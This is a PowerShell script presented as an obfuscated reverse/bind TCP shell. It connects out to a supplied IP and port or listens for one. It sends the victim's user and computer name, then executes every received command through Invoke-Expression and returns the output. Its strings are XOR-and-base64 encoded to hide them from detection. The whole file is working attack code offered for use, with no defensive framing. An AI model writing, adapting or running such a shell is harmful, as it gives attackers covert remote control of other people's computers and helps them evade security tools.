function Invoke-PowerShellTcpObf
{
    <#
    .SYNOPSIS
        Obfuscated TCP PowerShell Reverse/Bind Shell
    #>

    [CmdletBinding()]
    Param(
        [String]$IP,
        [Int]$Port,
        [Switch]$Reverse,
        [Switch]$Bind
    )

    # ====================== STRING DECRYPTOR ======================
    function Decrypt-String {
        param([string]$enc)
        $key = 0xA5
        $bytes = [Convert]::FromBase64String($enc)
        for($i=0; $i -lt $bytes.Length; $i++) {
            $bytes[$i] = $bytes[$i] -bxor $key
        }
        return [System.Text.Encoding]::UTF8.GetString($bytes)
    }

    try {
        $client = $null
        $listener = $null

        if ($Reverse) {
            $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        }
        elseif ($Bind) {
            $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
            $listener.Start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$buffer = 0..65535 | % {0}

        # Encrypted Strings
        $s1 = Decrypt-String "HgwQEBkXFBcXERcW"
        $s2 = Decrypt-String "GxcWFBcXERcWFBc="
        $s3 = Decrypt-String "Kx0fGBkXFBcXERcW"
        $s4 = Decrypt-String "EBkXFBcXERcW"

        $banner = "$s1`nUser: $($env:USERNAME) @ $($env:COMPUTERNAME)`n`n"
        $prompt = Decrypt-String "EBkXFBcXERcWIA=="

        $sendBytes = [text.encoding]::ASCII.GetBytes($banner)
        $stream.Write($sendBytes, 0, $sendBytes.Length)

        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $cmd = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()

            try {
                $result = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $result = "$(Decrypt-String 'EBkXFBcXERcWIA==') $($_.Exception.Message)`n"
            }

            $fullOutput = $result + $prompt
            $responseBytes = [text.encoding]::ASCII.GetBytes($fullOutput)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
            $stream.Flush()
        }

        $client.Close()
        if ($listener) { $listener.Stop() }
    }
    catch {
        Write-Warning (Decrypt-String "Kx0fGBkXFBcXERcWIA==")
    }
}
